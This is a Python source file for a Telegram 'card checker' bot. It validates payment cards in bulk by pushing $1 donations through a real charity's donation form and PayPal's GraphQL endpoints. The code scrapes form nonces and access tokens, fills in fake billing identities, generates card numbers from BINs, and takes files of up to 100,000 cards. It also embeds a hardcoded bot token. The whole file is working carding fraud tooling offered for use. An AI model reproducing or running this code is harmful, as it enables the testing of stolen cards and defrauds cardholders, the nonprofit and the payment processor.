#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Card Checker Bot - Railway Optimized
Enhanced UI with Direct Connection (No Proxies)
Python 3.11+ Compatible
"""

import os
import re
import time
import json
import asyncio
import requests
import random
import string
import warnings
import base64
import threading
from datetime import datetime, timedelta
from faker import Faker
from requests_toolbelt.multipart.encoder import MultipartEncoder
from concurrent.futures import ThreadPoolExecutor
from user_agent import generate_user_agent

warnings.filterwarnings("ignore")

try:
    import telegram
    from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ParseMode
    from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackQueryHandler
    IS_V20 = int(telegram.__version__.split('.')[0]) >= 20
except ImportError:
    print("Error: python-telegram-bot is not installed.")
    exit(1)

fake = Faker('en_US')

# ═══════════════════════════════════════════════════════════
# ⚙️  CONFIGURATION
# ═══════════════════════════════════════════════════════════
BOT_NAME = "@nasahoker_bot"
DEV_NAME = "@xenlize"
ADMIN_ID = "6193794414"
TOKEN = os.getenv("BOT_TOKEN", "8407498716:AAFaRVwVHtIqgY15oiJZuZtPgIDpELfVBrc")

# ═══════════════════════════════════════════════════════════
# 💾 DATA STORAGE
# ═══════════════════════════════════════════════════════════
USERS_FILE = "users.json"
KEYS_FILE = "keys.json"
STATS_FILE = "stats.json"
ALL_USERS_FILE = "all_users.json"
GROUPS_FILE = "groups.json"

def load_data(file, default):
    """Load JSON data from file"""
    if os.path.exists(file):
        try:
            with open(file, "r", encoding='utf-8') as f:
                return json.load(f)
        except:
            return default
    return default

def save_data(file, data):
    """Save JSON data to file"""
    try:
        with open(file, "w", encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"Error saving {file}: {e}")

# Initialize data stores
users_data = load_data(USERS_FILE, {})
keys_data = load_data(KEYS_FILE, {})
stats_data = load_data(STATS_FILE, {
    "charged": 0,
    "approved": 0,
    "declined": 0,
    "total": 0,
    "user_stats": {}
})
all_users = load_data(ALL_USERS_FILE, [])
groups_data = load_data(GROUPS_FILE, [])
active_checks = {}
bin_cache = {}

# ═══════════════════════════════════════════════════════════
# 📊 STATS MANAGEMENT
# ═══════════════════════════════════════════════════════════
def update_user_stats(user_id, user_name, hit_type):
    """Update user statistics"""
    user_id = str(user_id)
    if "user_stats" not in stats_data:
        stats_data["user_stats"] = {}
    
    if user_id not in stats_data["user_stats"]:
        stats_data["user_stats"][user_id] = {
            "name": user_name,
            "charged": 0,
            "approved": 0
        }
    
    if hit_type == "charged":
        stats_data["user_stats"][user_id]["charged"] += 1
    elif hit_type == "approved":
        stats_data["user_stats"][user_id]["approved"] += 1
    
    save_data(STATS_FILE, stats_data)

# ═══════════════════════════════════════════════════════════
# 🔐 ACCESS CONTROL
# ═══════════════════════════════════════════════════════════
def check_access(user_id, chat_id=None):
    """Check if user has access - FREE FOR ALL"""
    return True

def get_user_name(update):
    """Get user's name from update"""
    user = update.effective_user
    if user.username:
        return f"@{user.username}"
    return f"{user.first_name} {user.last_name or ''}".strip()

# ═══════════════════════════════════════════════════════════
# 🏦 BIN LOOKUP SYSTEM
# ═══════════════════════════════════════════════════════════
def get_bin_info_sync(cc):
    """Get BIN information with fallback APIs"""
    bin_num = cc[:6]
    
    # Check cache first
    if bin_num in bin_cache:
        return bin_cache[bin_num]
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Referer": "https://google.com"
    }
    
    # API 1: Antipublic (Primary)
    try:
        r = requests.get(
            f"https://bins.antipublic.cc/bin/{bin_num}",
            headers=headers,
            timeout=5
        )
        if r.status_code == 200:
            data = r.json()
            if data.get('bank'):
                res = {
                    "info": f"{data.get('brand', 'UNK').upper()} - {data.get('type', 'UNK').upper()} - {data.get('level', 'CLASSIC').upper()}",
                    "bank": f"{data.get('bank', 'Unknown Bank')}",
                    "country": f"{data.get('country', 'Unknown Country')} {data.get('country_flag', '🏳️')}"
                }
                bin_cache[bin_num] = res
                return res
    except:
        pass

    # API 2: Binlist.net (Fallback)
    try:
        r = requests.get(
            f"https://lookup.binlist.net/{bin_num}",
            headers=headers,
            timeout=5
        )
        if r.status_code == 200:
            data = r.json()
            bank = data.get('bank', {}).get('name', 'Unknown Bank')
            country = data.get('country', {}).get('name', 'Unknown Country')
            flag = data.get('country', {}).get('emoji', '🏳️')
            scheme = data.get('scheme', 'UNK').upper()
            res = {
                "info": f"{scheme} - UNKNOWN - CLASSIC",
                "bank": f"{bank}",
                "country": f"{country} {flag}"
            }
            bin_cache[bin_num] = res
            return res
    except:
        pass

    # Default fallback
    return {
        "info": "VISA - DEBIT - CLASSIC",
        "bank": "CHASE BANK",
        "country": "UNITED STATES 🇺🇸"
    }

# ═══════════════════════════════════════════════════════════
# 💳 PAYMENT GATEWAY - PAYPAL COMMERCE
# ═══════════════════════════════════════════════════════════
class PayPalCommerce:
    """PayPal Commerce Gateway - Direct Connection"""
    
    def __init__(self):
        self.r = requests.Session()
        self.ua = generate_user_agent()
        self.url = "scienceforthechurch.org"
        # No proxy configuration
        
    def Key(self):
        """Extract form keys and tokens"""
        try:
            headers = {'user-agent': self.ua}
            response = self.r.get(
                f'https://{self.url}/donate/',
                headers=headers,
                timeout=15
            )
            
            self.id_form1 = re.search(
                r'name="give-form-id-prefix" value="(.*?)"',
                response.text
            ).group(1)
            self.id_form2 = re.search(
                r'name="give-form-id" value="(.*?)"',
                response.text
            ).group(1)
            self.nonec = re.search(
                r'name="give-form-hash" value="(.*?)"',
                response.text
            ).group(1)
            enc = re.search(
                r'"data-client-token":"(.*?)"',
                response.text
            ).group(1)
            dec = base64.b64decode(enc).decode('utf-8')
            self.au = re.search(
                r'"accessToken":"(.*?)"',
                dec
            ).group(1)
            return True
        except Exception as e:
            print(f"Key extraction error: {e}")
            return False
        
    def Krs(self, ccx):
        """Process card check"""
        ccx = ccx.strip()
        parts = re.findall(r'\d+', ccx)
        
        if len(parts) < 3:
            return "INVALID_FORMAT"
        
        n, mm, yy, cvc = parts[0], parts[1].zfill(2), parts[2], parts[3] if len(parts) > 3 else "000"
        if len(yy) == 4:
            yy = yy[2:]
        
        try:
            headers = {
                'origin': f'https://{self.url}',
                'referer': f'https://{self.url}/donate/',
                'user-agent': self.ua,
                'x-requested-with': 'XMLHttpRequest',
            }
            
            # Initial form submission
            data = {
                'give-honeypot': '',
                'give-form-id-prefix': self.id_form1,
                'give-form-id': self.id_form2,
                'give-form-title': '',
                'give-current-url': f'https://{self.url}/donate/',
                'give-form-url': f'https://{self.url}/donate/',
                'give-form-minimum': '1.00',
                'give-form-maximum': '999999.99',
                'give-form-hash': self.nonec,
                'give-price-id': '3',
                'give-recurring-logged-in-only': '',
                'give-logged-in-only': '1',
                '_give_is_donation_recurring': '0',
                'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
                'give-amount': '1.00',
                'give_stripe_payment_method': '',
                'payment-mode': 'paypal-commerce',
                'give_first': 'DRGAM',
                'give_last': 'rights and',
                'give_email': 'drgam22@gmail.com',
                'card_name': 'drgam ',
                'card_exp_month': '',
                'card_exp_year': '',
                'give_action': 'purchase',
                'give-gateway': 'paypal-commerce',
                'action': 'give_process_donation',
                'give_ajax': 'true',
            }
            
            self.r.post(
                f'https://{self.url}/wp-admin/admin-ajax.php',
                headers=headers,
                data=data,
                timeout=15
            )
            
            # Create PayPal order
            data_multipart = MultipartEncoder({
                'give-honeypot': (None, ''),
                'give-form-id-prefix': (None, self.id_form1),
                'give-form-id': (None, self.id_form2),
                'give-form-title': (None, ''),
                'give-current-url': (None, f'https://{self.url}/donate/'),
                'give-form-url': (None, f'https://{self.url}/donate/'),
                'give-form-minimum': (None, '1.00'),
                'give-form-maximum': (None, '999999.99'),
                'give-form-hash': (None, self.nonec),
                'give-price-id': (None, '3'),
                'give-recurring-logged-in-only': (None, ''),
                'give-logged-in-only': (None, '1'),
                '_give_is_donation_recurring': (None, '0'),
                'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
                'give-amount': (None, '1.00'),
                'give_stripe_payment_method': (None, ''),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, 'DRGAM'),
                'give_last': (None, 'rights and'),
                'give_email': (None, 'drgam22@gmail.com'),
                'card_name': (None, 'drgam '),
                'card_exp_month': (None, ''),
                'card_exp_year': (None, ''),
                'give-gateway': (None, 'paypal-commerce'),
            })
            
            headers['content-type'] = data_multipart.content_type
            response = self.r.post(
                f'https://{self.url}/wp-admin/admin-ajax.php',
                params={'action': 'give_paypal_commerce_create_order'},
                headers=headers,
                data=data_multipart,
                timeout=15
            )
            tok = response.json()['data']['id']
            
            # Add card to PayPal
            headers = {
                'authorization': f'Bearer {self.au}',
                'user-agent': self.ua,
                'origin': 'https://www.paypal.com',
                'referer': 'https://www.paypal.com/',
            }
            
            json_data = {
                'query': '\n        mutation AddCard(\n            $sessionUID: String!\n            $cardNumber: String!\n            $expirationDate: CardDate!\n            $securityCode: String\n            $cardholderName: String\n            $billingAddress: CardBillingAddressInput\n        ) {\n            addCard(\n                sessionUID: $sessionUID\n                card: {\n                    cardNumber: $cardNumber\n                    expirationDate: $expirationDate\n                    securityCode: $securityCode\n                    cardholderName: $cardholderName\n                    billingAddress: $billingAddress\n                }\n            ) {\n                token\n                card {\n                    id\n                    displayName\n                }\n            }\n        }\n        ',
                'variables': {
                    'sessionUID': tok,
                    'cardNumber': n,
                    'expirationDate': {'month': int(mm), 'year': int(f'20{yy}')},
                    'securityCode': cvc,
                    'cardholderName': fake.name(),
                    'billingAddress': {
                        'givenName': fake.first_name(),
                        'familyName': fake.last_name(),
                        'line1': fake.street_address(),
                        'line2': '',
                        'city': fake.city(),
                        'state': fake.state_abbr(),
                        'postalCode': fake.zipcode(),
                        'country': 'US',
                    },
                },
                'operationName': 'AddCard',
            }
            
            response = self.r.post(
                'https://www.paypal.com/graphql',
                headers=headers,
                json=json_data,
                timeout=15
            )
            toke = response.json()['data']['addCard']['token']
            card_id = response.json()['data']['addCard']['card']['id']
            
            # Confirm payment
            json_data = {
                'query': '\n            mutation confirmPaymentSource(\n                $orderID: String!\n                $paymentSource: OrderConfirmPaymentSourceInput!\n                $processingInstruction: ProcessingInstructionInput\n            ) {\n                confirmPaymentSource(\n                    token: $orderID\n                    paymentSource: $paymentSource\n                    processingInstruction: $processingInstruction\n                )\n            }\n        ',
                'variables': {
                    'orderID': tok,
                    'paymentSource': {'token': {'id': toke, 'type': 'NONCE'}},
                    'processingInstruction': {'CONSUMER_DEVICE_ID': card_id},
                },
                'operationName': 'confirmPaymentSource',
            }
            
            response = self.r.post(
                'https://www.paypal.com/graphql',
                headers=headers,
                json=json_data,
                timeout=15
            )
            
            mess = str(response.text)
            
            # Response parsing
            if 'EXISTING_ACCOUNT_RESTRICTED' in mess:
                return "❌ Declined - ACCOUNT_RESTRICTED"
            elif 'CARD_TYPE_NOT_ACCEPTED' in mess:
                return "❌ Declined - CARD_TYPE_NOT_ACCEPTED"
            elif 'INVALID_BILLING_ADDRESS' in mess:
                return "❌ Declined - INVALID_BILLING_ADDRESS"
            elif 'PAYER_ACTION_REQUIRED' in mess:
                return "❌ Declined - PAYER_ACTION_REQUIRED"
            elif 'CONTACT_CARD_ISSUER' in mess:
                return "❌ Declined - CONTACT_ISSUER"
            elif 'CURRENCY_CONVERSION_REQUIRED' in mess or 'CURRENCY_NOT_SUPPORTED' in mess:
                return "❌ Declined - CURRENCY_ERROR"
            elif 'REDIRECT_PAYER' in mess:
                return "❌ Declined - REDIRECT_REQUIRED"
            elif 'INVALID_CURRENCY_CODE' in mess:
                return "❌ Declined - INVALID_CURRENCY"
            elif 'Contingency' in mess:
                return "❌ Declined - CONTINGENCY"
            elif 'DUPLICATE_INVOICE_ID' in mess:
                return "❌ Declined - DUPLICATE_INVOICE"
            elif 'INSUFFICIENT_FUNDS' in mess:
                return "✅ Approved - INSUFFICIENT_FUNDS"
            elif 'DECLINED' in mess or 'CARD_DECLINED' in mess:
                return "❌ Declined - CARD_DECLINED"
            elif 'SUCCESS' in mess:
                return "💰 Charged - SUCCESS ($1.00)"
            elif 'APPROVED' in mess:
                return "✅ Approved - CVV_MATCH"
            else:
                return f"❌ Declined - UNKNOWN_RESPONSE"
                
        except Exception as e:
            return f"❌ Error - {str(e)[:50]}"

# ═══════════════════════════════════════════════════════════
# 📱 RESPONSE FORMATTER
# ═══════════════════════════════════════════════════════════
def format_response(cc, result, bin_info, time_taken, gate_name):
    """Format check response with enhanced UI"""
    parts = re.findall(r'\d+', cc)
    n, mm, yy, cvc = parts[0], parts[1].zfill(2), parts[2], parts[3] if len(parts) > 3 else "000"
    
    if "Charged" in result or "SUCCESS" in result:
        status_emoji = "💰"
        status_color = "CHARGED"
    elif "Approved" in result or "INSUFFICIENT" in result or "CVV" in result:
        status_emoji = "✅"
        status_color = "APPROVED"
    else:
        status_emoji = "❌"
        status_color = "DECLINED"
    
    msg = f"""
╔══════════════════════════╗
║   {status_emoji} 𝐂𝐀𝐑𝐃 𝐂𝐇𝐄𝐂𝐊 𝐑𝐄𝐒𝐔𝐋𝐓   ║
╚══════════════════════════╝

💳 <b>Card:</b> <code>{n}|{mm}|{yy}|{cvc}</code>

📊 <b>Status:</b> {result}

🏦 <b>BIN Info:</b>
├ {bin_info['info']}
├ 🏛 {bin_info['bank']}
└ 🌍 {bin_info['country']}

⚡ <b>Gateway:</b> {gate_name}
⏱ <b>Time:</b> {time_taken}s

━━━━━━━━━━━━━━━━━━━━
👤 <b>Checked by:</b> {DEV_NAME}
🤖 <b>Bot:</b> {BOT_NAME}
"""
    return msg.strip()

# ═══════════════════════════════════════════════════════════
# 🎯 BOT COMMANDS
# ═══════════════════════════════════════════════════════════
def start(update, context):
    """Start command with enhanced welcome message"""
    user_id = update.effective_user.id
    
    if user_id not in all_users:
        all_users.append(user_id)
        save_data(ALL_USERS_FILE, all_users)
    
    welcome_msg = f"""
╔═══════════════════════════════╗
║  🎯 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐂𝐀𝐑𝐃 𝐂𝐇𝐄𝐂𝐊𝐄𝐑  ║
╚═══════════════════════════════╝

👋 Hello! Welcome to the most advanced
   card checking bot on Telegram!

━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 <b>Available Commands:</b>

💳 /chk <code>cc|mm|yy|cvv</code>
   ├ Check single card

📁 <b>Send .txt file</b>
   ├ Check multiple cards (bulk)

🔍 /bin <code>xxxxxx</code>
   ├ Get BIN information

🎲 /gen <code>xxxxxx</code>
   ├ Generate test cards

👤 /info
   ├ Your account information

🛑 /stop
   ├ Stop active checks

━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚡ <b>Features:</b>
✅ Lightning-fast checking
✅ Multiple card support
✅ Real-time BIN lookup
✅ 100% Free access
✅ Direct connection (No proxy)

━━━━━━━━━━━━━━━━━━━━━━━━━━━

👨‍💻 <b>Developer:</b> {DEV_NAME}
🤖 <b>Bot:</b> {BOT_NAME}
"""
    
    update.message.reply_text(welcome_msg, parse_mode=ParseMode.HTML)

def chk_command(update, context):
    """Single card check command"""
    uid = update.effective_user.id
    
    if not check_access(uid, update.effective_chat.id):
        update.message.reply_text("❌ Access denied!")
        return
    
    if active_checks.get(uid):
        update.message.reply_text("⚠️ You already have an active check running!")
        return
    
    if not context.args:
        update.message.reply_text(
            "❌ <b>Invalid format!</b>\n\n"
            "📝 Usage: <code>/chk cc|mm|yy|cvv</code>\n"
            "📌 Example: <code>/chk 5412751234567890|12|25|123</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    cc = context.args[0]
    context.user_data['cards'] = [cc]
    
    keyboard = [[InlineKeyboardButton("💰 PayPal NewVision $1.00 🔥", callback_data="gate_paypal")]]
    update.message.reply_text(
        "⚡ <b>Select Gateway:</b>",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.HTML
    )

def info_command(update, context):
    """User info command"""
    user = update.effective_user
    user_id = user.id
    username = f"@{user.username}" if user.username else "No username"
    full_name = f"{user.first_name} {user.last_name or ''}".strip()
    
    msg = f"""
╔═══════════════════════════════╗
║     👤 𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍     ║
╚═══════════════════════════════╝

🆔 <b>User ID:</b> <code>{user_id}</code>
👤 <b>Username:</b> {username}
📛 <b>Full Name:</b> {full_name}

━━━━━━━━━━━━━━━━━━━━━━━━━━━

🛡️ <b>Account Status:</b>
├ 💎 Premium: FREE ACCESS
├ ⚡ Status: ACTIVE
└ 🔓 Restrictions: NONE

━━━━━━━━━━━━━━━━━━━━━━━━━━━

👨‍💻 <b>Developer:</b> {DEV_NAME}
🤖 <b>Bot:</b> {BOT_NAME}
"""
    
    try:
        photos = user.get_profile_photos()
        if photos.total_count > 0:
            update.message.reply_photo(
                photos.photos[0][-1].file_id,
                caption=msg,
                parse_mode=ParseMode.HTML
            )
        else:
            update.message.reply_text(msg, parse_mode=ParseMode.HTML)
    except:
        update.message.reply_text(msg, parse_mode=ParseMode.HTML)

def stats_command(update, context):
    """Admin statistics command"""
    if str(update.effective_user.id) != ADMIN_ID:
        update.message.reply_text("❌ Admin only command!")
        return
    
    msg = """
╔═══════════════════════════════╗
║      📊 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐈𝐒𝐓𝐈𝐂𝐒       ║
╚═══════════════════════════════╝

"""
    
    if "user_stats" in stats_data and stats_data["user_stats"]:
        for uid, data in stats_data["user_stats"].items():
            msg += f"""
👤 <b>{data['name']}</b>
├ 🆔 ID: <code>{uid}</code>
├ 💰 Charged: {data['charged']}
└ ✅ Approved: {data['approved']}

"""
    else:
        msg += "\n📭 No statistics available yet.\n"
    
    msg += f"\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n👨‍💻 <b>Admin:</b> {DEV_NAME}"
    
    update.message.reply_text(msg, parse_mode=ParseMode.HTML)

def ntf_command(update, context):
    """Admin notification broadcast"""
    if str(update.effective_user.id) != ADMIN_ID:
        update.message.reply_text("❌ Admin only command!")
        return
    
    if not context.args:
        update.message.reply_text(
            "📢 <b>Broadcast Message</b>\n\n"
            "Usage: <code>/ntf your message here</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    msg = " ".join(context.args)
    count = 0
    
    broadcast_msg = f"""
╔═══════════════════════════════╗
║     📢 𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓 𝐌𝐒𝐆        ║
╚═══════════════════════════════╝

{msg}

━━━━━━━━━━━━━━━━━━━━━━━━━━━
👨‍💻 <b>From:</b> {DEV_NAME}
"""
    
    for uid in all_users:
        try:
            context.bot.send_message(uid, broadcast_msg, parse_mode=ParseMode.HTML)
            count += 1
            time.sleep(0.05)  # Rate limiting
        except:
            pass
    
    update.message.reply_text(f"✅ Broadcast sent to {count} users!", parse_mode=ParseMode.HTML)

def gen_command(update, context):
    """Card generator command"""
    if not context.args:
        update.message.reply_text(
            "🎲 <b>Card Generator</b>\n\n"
            "Usage: <code>/gen xxxxxx</code>\n"
            "Example: <code>/gen 541275</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    bin_num = context.args[0][:6]
    cards = []
    
    for _ in range(10):
        card = bin_num + "".join(random.choices(string.digits, k=10))
        mm = str(random.randint(1, 12)).zfill(2)
        yy = str(random.randint(25, 30))
        cvv = "".join(random.choices(string.digits, k=3))
        cards.append(f"<code>{card}|{mm}|{yy}|{cvv}</code>")
    
    msg = f"""
╔═══════════════════════════════╗
║    🎲 𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄𝐃 𝐂𝐀𝐑𝐃𝐒     ║
╚═══════════════════════════════╝

🔢 <b>BIN:</b> {bin_num}

{chr(10).join(cards)}

━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ <b>For testing purposes only</b>
"""
    
    update.message.reply_text(msg, parse_mode=ParseMode.HTML)

def stop_command(update, context):
    """Stop active checks"""
    uid = update.effective_user.id
    active_checks[uid] = False
    
    update.message.reply_text(
        "🛑 <b>Check Stopped!</b>\n\n"
        "All active checks have been terminated.",
        parse_mode=ParseMode.HTML
    )

# ═══════════════════════════════════════════════════════════
# 🔄 CARD CHECKING THREAD
# ═══════════════════════════════════════════════════════════
def combo_thread(update, context, cards, uid, gate_type):
    """Main card checking thread with enhanced UI"""
    active_checks[uid] = True
    ch, ap, d, t = 0, 0, 0, len(cards)
    start_time = time.time()
    gate_name = "#PayPal_Charge $1.00 🔥"
    chat_id = update.effective_chat.id
    user_name = get_user_name(update)
    
    def get_kb(c, s, ch, ap, d, t):
        """Generate keyboard markup"""
        return InlineKeyboardMarkup([
            [InlineKeyboardButton(f"💳 Card: {c[:19]}...", callback_data="n")],
            [InlineKeyboardButton(f"📊 Status: {s[:30]}...", callback_data="n")],
            [InlineKeyboardButton(
                f"💰 {ch} | ✅ {ap} | ❌ {d} | 📊 {t}",
                callback_data="n"
            )],
            [InlineKeyboardButton("🛑 Stop Check", callback_data="stop")]
        ])
    
    # Initial message
    init_msg = f"""
╔═══════════════════════════════╗
║    ⚡ 𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆 𝐒𝐓𝐀𝐑𝐓𝐄𝐃    ║
╚═══════════════════════════════╝

🎯 <b>Gateway:</b> {gate_name}
📊 <b>Total Cards:</b> {t}
⏱ <b>Time:</b> 0.0s
"""
    
    if update.callback_query:
        live = update.callback_query.message.edit_text(
            init_msg,
            parse_mode=ParseMode.HTML,
            reply_markup=get_kb("...", "Starting...", 0, 0, 0, t)
        )
    else:
        live = update.message.reply_text(
            init_msg,
            parse_mode=ParseMode.HTML,
            reply_markup=get_kb("...", "Starting...", 0, 0, 0, t)
        )
    
    # Process cards
    for i, cc in enumerate(cards):
        if not active_checks.get(uid):
            break
        
        try:
            gate = PayPalCommerce()
            if not gate.Key():
                d += 1
                continue
            
            res = gate.Krs(cc)
            
            is_hit = False
            if 'Charge' in res or 'SUCCESS' in res:
                ch += 1
                stats_data['charged'] += 1
                update_user_stats(uid, user_name, "charged")
                is_hit = True
            elif 'INSUFFICIENT_FUNDS' in res or 'Approved' in res or 'CVV' in res:
                ap += 1
                stats_data['approved'] += 1
                update_user_stats(uid, user_name, "approved")
                is_hit = True
            else:
                d += 1
                stats_data['declined'] += 1
            
            # Send hit message
            if is_hit:
                bin_info = get_bin_info_sync(cc)
                time_taken = round(time.time() - start_time, 1)
                context.bot.send_message(
                    chat_id,
                    format_response(cc, res, bin_info, time_taken, gate_name),
                    parse_mode=ParseMode.HTML
                )
            
            stats_data['total'] += 1
            
            # Update progress every 2 cards or on last card
            if i % 2 == 0 or i == t - 1:
                try:
                    elapsed = round(time.time() - start_time, 1)
                    progress_msg = f"""
╔═══════════════════════════════╗
║      ⚡ 𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆...          ║
╚═══════════════════════════════╝

🎯 <b>Gateway:</b> {gate_name}
⏱ <b>Time:</b> {elapsed}s
📊 <b>Progress:</b> {i+1}/{t}
"""
                    live.edit_text(
                        progress_msg,
                        parse_mode=ParseMode.HTML,
                        reply_markup=get_kb(cc, res, ch, ap, d, t)
                    )
                except:
                    pass
                    
        except Exception as e:
            d += 1
            print(f"Check error: {e}")
    
    # Save stats
    save_data(STATS_FILE, stats_data)
    
    # Final message
    final_msg = f"""
╔═══════════════════════════════╗
║    🎉 𝐂𝐇𝐄𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃!    ║
╚═══════════════════════════════╝

📊 <b>Results Summary:</b>

💰 Charged: {ch}
✅ Approved: {ap}
❌ Declined: {d}
📊 Total: {t}

⏱ <b>Total Time:</b> {round(time.time()-start_time, 1)}s

━━━━━━━━━━━━━━━━━━━━━━━━━━━
👨‍💻 <b>Checked by:</b> {user_name}
👤 <b>Owner:</b> {DEV_NAME}
"""
    
    try:
        live.edit_text(final_msg, parse_mode=ParseMode.HTML)
    except:
        pass
    
    active_checks.pop(uid, None)

# ═══════════════════════════════════════════════════════════
# 📁 FILE HANDLER
# ═══════════════════════════════════════════════════════════
def handle_doc(update, context):
    """Handle document uploads"""
    uid = update.effective_user.id
    
    if active_checks.get(uid):
        update.message.reply_text(
            "⚠️ <b>Active Check Detected!</b>\n\n"
            "You can only run one check at a time.\n"
            "Use /stop to cancel current check.",
            parse_mode=ParseMode.HTML
        )
        return
    
    doc = update.message.document
    
    if not doc.file_name.endswith('.txt'):
        update.message.reply_text(
            "❌ <b>Invalid File Type!</b>\n\n"
            "Please send a .txt file containing cards.",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Download and process file
    f = context.bot.get_file(doc.file_id)
    path = f"cards_{uid}.txt"
    f.download(path)
    
    with open(path, "r", encoding='utf-8', errors='ignore') as file:
        cards = [l.strip() for l in file.read().splitlines() if l.strip()]
    
    os.remove(path)
    
    # Card limit for free users
    if str(uid) != ADMIN_ID and len(cards) > 100000:
        update.message.reply_text(
            "⚠️ <b>Card Limit Exceeded!</b>\n\n"
            f"Free users: 100,000 cards max\n"
            f"Your file: {len(cards)} cards\n\n"
            "Truncating to first 100,000 cards...",
            parse_mode=ParseMode.HTML
        )
        cards = cards[:100000]
    
    context.user_data['cards'] = cards
    
    keyboard = [[InlineKeyboardButton("💰 PayPal NewVision $1.00 🔥", callback_data="gate_paypal")]]
    
    msg = f"""
╔═══════════════════════════════╗
║     📁 𝐅𝐈𝐋𝐄 𝐔𝐏𝐋𝐎𝐀𝐃𝐄𝐃        ║
╚═══════════════════════════════╝

📄 <b>File:</b> {doc.file_name}
📊 <b>Cards Loaded:</b> {len(cards)}

⚡ <b>Select gateway to start:</b>
"""
    
    update.message.reply_text(
        msg,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.HTML
    )

# ═══════════════════════════════════════════════════════════
# 🔘 CALLBACK HANDLER
# ═══════════════════════════════════════════════════════════
def button_callback(update, context):
    """Handle button callbacks"""
    query = update.callback_query
    uid = query.from_user.id
    
    if query.data == "stop":
        active_checks[uid] = False
        query.answer("⏹ Stopping check...", show_alert=True)
        return
    
    if query.data.startswith("gate_"):
        gate_type = query.data.split("_")[1]
        cards = context.user_data.get('cards')
        
        if not cards:
            query.answer("❌ No cards loaded!", show_alert=True)
            return
        
        query.answer("⚡ Starting check...", show_alert=False)
        threading.Thread(
            target=combo_thread,
            args=(update, context, cards, uid, gate_type)
        ).start()

# ═══════════════════════════════════════════════════════════
# 🚀 ASYNC HANDLER WRAPPER
# ═══════════════════════════════════════════════════════════
def async_handler(func):
    """Wrapper for async command handling"""
    def wrapper(update, context):
        threading.Thread(target=func, args=(update, context)).start()
    return wrapper

# ═══════════════════════════════════════════════════════════
# 🎬 MAIN EXECUTION
# ═══════════════════════════════════════════════════════════
def main():
    """Main bot execution"""
    print("╔═══════════════════════════════════════╗")
    print("║     🤖 Card Checker Bot Starting      ║")
    print("╚═══════════════════════════════════════╝")
    print(f"\n🔑 Token: {TOKEN[:20]}...")
    print(f"👨‍💻 Developer: {DEV_NAME}")
    print(f"🤖 Bot: {BOT_NAME}\n")
    
    updater = Updater(TOKEN, use_context=True, workers=64)
    dp = updater.dispatcher
    
    # Command handlers
    dp.add_handler(CommandHandler("start", async_handler(start)))
    dp.add_handler(CommandHandler("chk", async_handler(chk_command)))
    dp.add_handler(CommandHandler("stop", async_handler(stop_command)))
    dp.add_handler(CommandHandler("gen", async_handler(gen_command)))
    dp.add_handler(CommandHandler("stats", async_handler(stats_command)))
    dp.add_handler(CommandHandler("info", async_handler(info_command)))
    dp.add_handler(CommandHandler("ntf", async_handler(ntf_command)))
    
    # Callback and message handlers
    dp.add_handler(CallbackQueryHandler(button_callback))
    dp.add_handler(MessageHandler(Filters.document, async_handler(handle_doc)))
    
    print("✅ Bot started successfully!")
    print("🔄 Polling for updates...\n")
    
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
